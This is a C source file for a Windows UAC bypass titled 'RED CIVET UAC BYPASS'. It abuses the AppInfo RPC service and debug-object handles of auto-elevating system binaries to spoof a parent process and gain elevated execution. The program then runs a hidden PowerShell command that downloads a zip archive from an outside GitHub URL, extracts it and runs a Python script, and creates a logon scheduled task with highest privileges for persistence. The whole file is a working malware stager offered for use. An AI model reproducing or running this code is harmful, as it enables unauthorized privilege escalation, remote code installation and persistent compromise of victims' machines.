#include <windows.h>
#include <stdio.h>
#include <rpc.h>
#include <rpcndr.h>
#include <shlwapi.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

// --- Constants & Typedefs ---
#define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
#define T_DEFAULT_DESKTOP L"WinSta0\\Default"
#define WINVER_EXE L"\\winver.exe"
#define COMPUTERDEFAULTS_EXE L"\\ComputerDefaults.exe"
#define ProcessDebugObjectHandle 30
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef LONG NTSTATUS;
typedef struct _UC_CONTEXT {
    WCHAR szSystemDirectory[MAX_PATH + 1];
    WCHAR szSystemRoot[MAX_PATH + 1];
} UC_CONTEXT, *PUC_CONTEXT;

UC_CONTEXT g_ctx_struct;
PUC_CONTEXT g_ctx = &g_ctx_struct;

// --- Native Prototypes ---
extern NTSTATUS NTAPI NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
extern NTSTATUS NTAPI NtRemoveProcessDebug(HANDLE, HANDLE);
extern NTSTATUS NTAPI NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
extern VOID NTAPI DbgUiSetThreadDebugObject(HANDLE);
extern NTSTATUS NTAPI NtClose(HANDLE);

// --- AppInfo RPC Structures (Omitted for brevity, use same as previous) ---
typedef struct _MONITOR_POINT { long MonitorLeft; long MonitorRight; } MONITOR_POINT;
typedef struct _APP_STARTUP_INFO {
    wchar_t* lpszTitle; long dwX; long dwY; long dwXSize; long dwYSize;
    long dwXCountChars; long dwYCountChars; long dwFillAttribute; long dwFlags;
    short wShowWindow; short cbReserved2; struct _MONITOR_POINT MonitorPoint;
} APP_STARTUP_INFO;

typedef struct _APP_PROCESS_INFORMATION {
    unsigned __int3264 ProcessHandle; unsigned __int3264 ThreadHandle;
    long ProcessId; long ThreadId;
} APP_PROCESS_INFORMATION;

// RPC Infrastructure
typedef struct { short Pad; unsigned char Format[75]; } appinfo_MIDL_TYPE_FORMAT_STRING;
typedef struct { short Pad; unsigned char Format[103]; } appinfo_MIDL_PROC_FORMAT_STRING;
static const appinfo_MIDL_TYPE_FORMAT_STRING appinfo__MIDL_TypeFormatString = { 0, { 0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x0a, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b, 0x1a, 0x03, 0x38, 0x00, 0x00, 0x00, 0x14, 0x00, 0x36, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x4c, 0x00, 0xe3, 0xff, 0x40, 0x5c, 0x5b, 0x12, 0x08, 0x05, 0x5c, 0x11, 0x04, 0x02, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9, 0xb9, 0x08, 0x08, 0x5c, 0x5b, 0x11, 0x0c, 0x08, 0x5c, 0x00 } };
static const appinfo_MIDL_PROC_FORMAT_STRING appinfo__MIDL_ProcFormatString = { 0, { 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x32, 0x00, 0x08, 0x00, 0x20, 0x00, 0x24, 0x00, 0xc7, 0x0c, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x02, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x02, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x30, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x38, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x40, 0x00, 0x16, 0x00, 0x48, 0x00, 0x48, 0x00, 0xb9, 0x00, 0x48, 0x00, 0x50, 0x00, 0x08, 0x00, 0x13, 0x61, 0x58, 0x00, 0x38, 0x00, 0x50, 0x21, 0x60, 0x00, 0x08, 0x00, 0x70, 0x00, 0x68, 0x00, 0x08, 0x00, 0x00 } };
static const RPC_CLIENT_INTERFACE LaunchAdminProcess___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0x201ef99a,0x7fa0,0x444c,{0x93,0x99,0x19,0xba,0x84,0xf1,0x2a,0x1a}},{1,0}}, {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}}, 0, 0, 0, 0, 0, 0x00000000 };
static RPC_BINDING_HANDLE LaunchAdminProcess__MIDL_AutoBindHandle;
static const MIDL_STUB_DESC LaunchAdminProcess_StubDesc = { (void *)&LaunchAdminProcess___RpcClientInterface, NdrOleAllocate, NdrOleFree, &LaunchAdminProcess__MIDL_AutoBindHandle, 0, 0, 0, 0, appinfo__MIDL_TypeFormatString.Format, 1, 0x50002, 0, 0x801026e, 0, 0, 0, 0x1, 0, 0, 0 };

void RAiLaunchAdminProcess(PRPC_ASYNC_STATE AsyncHandle, handle_t hBinding, wchar_t *Path, wchar_t *Cmd, long SFlags, long CFlags, wchar_t *Dir, wchar_t *WSta, struct _APP_STARTUP_INFO *SInfo, unsigned __int3264 hWnd, long Tout, struct _APP_PROCESS_INFORMATION *PInfo, long *Elev) {
    NdrAsyncClientCall((PMIDL_STUB_DESC)&LaunchAdminProcess_StubDesc, (PFORMAT_STRING)&appinfo__MIDL_ProcFormatString.Format[0], AsyncHandle, hBinding, Path, Cmd, SFlags, CFlags, Dir, WSta, SInfo, hWnd, Tout, PInfo, Elev);
}

BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LPWSTR Dir, LPWSTR WSta, HWND hWnd, DWORD Tout, WORD Show, APP_PROCESS_INFORMATION *PInfo) {
    RPC_BINDING_HANDLE hBinding = NULL; RPC_ASYNC_STATE asyncState; RPC_STATUS status; RPC_SECURITY_QOS_V3 sqos; RPC_WSTR StringBinding = NULL; PSID LocalSystemSid = NULL; DWORD cbSid = SECURITY_MAX_SID_SIZE; APP_STARTUP_INFO appStartup = { 0 }; LONG elevationType = 0; VOID* Reply = NULL;
    status = RpcStringBindingComposeW((RPC_WSTR)APPINFO_RPC, L"ncalrpc", NULL, NULL, NULL, &StringBinding);
    status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
    RpcStringFreeW(&StringBinding);
    LocalSystemSid = (PSID)LocalAlloc(LPTR, cbSid);
    if (LocalSystemSid && CreateWellKnownSid(WinLocalSystemSid, NULL, LocalSystemSid, &cbSid)) {
        sqos.Version = 3; sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE; sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH; sqos.Sid = LocalSystemSid;
        status = RpcBindingSetAuthInfoExW(hBinding, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, NULL, 0, (RPC_SECURITY_QOS*)&sqos);
    }
    appStartup.dwFlags = STARTF_USESHOWWINDOW; appStartup.wShowWindow = Show;
    RpcAsyncInitializeHandle(&asyncState, sizeof(RPC_ASYNC_STATE)); asyncState.NotificationType = RpcNotificationTypeEvent; asyncState.u.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    RAiLaunchAdminProcess(&asyncState, hBinding, Path, Cmd, SFlags, CFlags, Dir, WSta, &appStartup, (unsigned __int3264)hWnd, Tout, PInfo, &elevationType);
    WaitForSingleObject(asyncState.u.hEvent, INFINITE);
    BOOL result = (RpcAsyncCompleteCall(&asyncState, &Reply) == RPC_S_OK);
    CloseHandle(asyncState.u.hEvent); RpcBindingFree(&hBinding);
    return result;
}

NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
    NTSTATUS status = (NTSTATUS)0xC0000001;
    SIZE_T size = 0;
    STARTUPINFOEXW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    // --- CRITICAL FIX 1: REMOVE PathFileExistsW ---
    // We cannot check if the "command line" exists as a file.
    
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    
    if (!si.lpAttributeList) return status;

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
        return status;
    }

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return status;
    }

    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE; // Keep it stealthy
    si.StartupInfo.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    // --- CRITICAL FIX 2: CreateProcessW Usage ---
    // Parameter 1: NULL (Let Windows parse the command line)
    // Parameter 2: Payload (The full command string)
    // Parameter 6: Must include CREATE_NO_WINDOW to fix Error 123/Visibility
    
    if (CreateProcessW(NULL, Payload, NULL, NULL, FALSE, 
        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, 
        NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
        
        printf("[SUCCESS] ucmx: Child PID %d created.\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        status = 0; // STATUS_SUCCESS
    } else {
        printf("[ERROR] ucmx: CreateProcessW failed. Error: %lu\n", GetLastError());
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    return status;
}

int main() {
    HANDLE dbgHandle = NULL, dbgProcessHandle = NULL, dupHandle = NULL;
    APP_PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;
    
    WCHAR szSystemDir[MAX_PATH];
    WCHAR szWindowsDir[MAX_PATH];
    WCHAR szProcess[MAX_PATH * 2];
    WCHAR targetPath[MAX_PATH] = { 0 };
    WCHAR weaponizedCmd[2048] = { 0 };

    // 1. GET ARGS
    int nArgs;
    LPWSTR* szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);

    printf("--- RED CIVET UAC BYPASS: DEBUG VERSION ---\n");

    // 3. INIT DIRECTORIES (Local stack instead of g_ctx)
    GetSystemDirectoryW(szSystemDir, MAX_PATH);
    GetWindowsDirectoryW(szWindowsDir, MAX_PATH);

    // 4. BUILD COMMAND
    swprintf_s(weaponizedCmd, 4086, 
        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wordPath='C:\\Windows\\Temp\\word.zip'; $extractPath='C:\\Windows\\Temp\\word'; $zipPath='C:\\Windows\\Temp\\pdf.exe'; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/releases/download/ok/office.zip', $wordPath); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($wordPath, $extractPath); Remove-Item $wordPath -Force; Start-Process \\\"$extractPath\\python.exe\\\" -ArgumentList \\\"$extractPath\\Lib\\system.py\\\" -WindowStyle Hidden; schtasks /create /tn 'ActiveOffices' /tr \\\"'$extractPath\\pythonw.exe' '$extractPath\\Lib\\system.py'\\\" /sc onlogon /delay 0001:00 /rl highest /f \"");

    printf("[DEBUG] Target: %ws\n", targetPath);
    printf("[DEBUG] Full Cmd: %ws\n", weaponizedCmd);

    // 5. PHASE 1: WINVER
    printf("[PHASE 1] Starting Winver RPC...\n");
    wcscpy_s(szProcess, MAX_PATH * 2, szSystemDir);
    wcscat_s(szProcess, MAX_PATH * 2, L"\\winver.exe");

    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
    
    // Using szWindowsDir (SystemRoot) directly here
    if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, szWindowsDir, L"WinSta0\\Default", NULL, INFINITE, SW_HIDE, &procInfo)) {
        printf("[FAIL] Stage 1 failed. Error: %lu\n", GetLastError());
        return 1;
    }

    NtQueryInformationProcess((HANDLE)procInfo.ProcessHandle, 30, &dbgHandle, sizeof(HANDLE), NULL);
    if (!dbgHandle) { printf("[FAIL] No DbgHandle\n"); return 1; }

    NtRemoveProcessDebug((HANDLE)procInfo.ProcessHandle, dbgHandle);
    TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
    CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);

    // 6. PHASE 2: COMPUTERDEFAULTS
    printf("[PHASE 2] Starting ComputerDefaults...\n");
    wcscpy_s(szProcess, MAX_PATH * 2, szSystemDir);
    wcscat_s(szProcess, MAX_PATH * 2, L"\\ComputerDefaults.exe");
    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));

    if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, szWindowsDir, L"WinSta0\\Default", NULL, INFINITE, SW_HIDE, &procInfo)) {
        printf("[FAIL] Stage 2 failed.\n"); return 1;
    }

    DbgUiSetThreadDebugObject(dbgHandle);

    while (1) {
        if (!WaitForDebugEvent(&dbgEvent, 5000)) { // 5 second timeout
            printf("[FAIL] Timeout waiting for debug event.\n");
            break;
        }

        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
            dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
        }

        if (dbgEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT && dbgProcessHandle) {
            printf("[PHASE 2] DLL Loaded. Spoofing Parent...\n");
            if (NtDuplicateObject(dbgProcessHandle, GetCurrentProcess(), GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, 0, 0) == 0) {
                // THE CRITICAL CALL
                ucmxCreateProcessFromParent(dupHandle, weaponizedCmd);
                printf("[SUCCESS] Payload launched via Parent 0x%p\n", dupHandle);
                NtClose(dupHandle);
            }
            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
            break; 
        }
        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }

    // 7. CLEANUP
    DebugActiveProcessStop(procInfo.ProcessId);
    DbgUiSetThreadDebugObject(NULL);
    NtClose(dbgHandle);
    TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
    
    if (szArglist) LocalFree(szArglist);
    printf("--- DONE ---\n");
    return 0;
}
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
{
    return main();
}
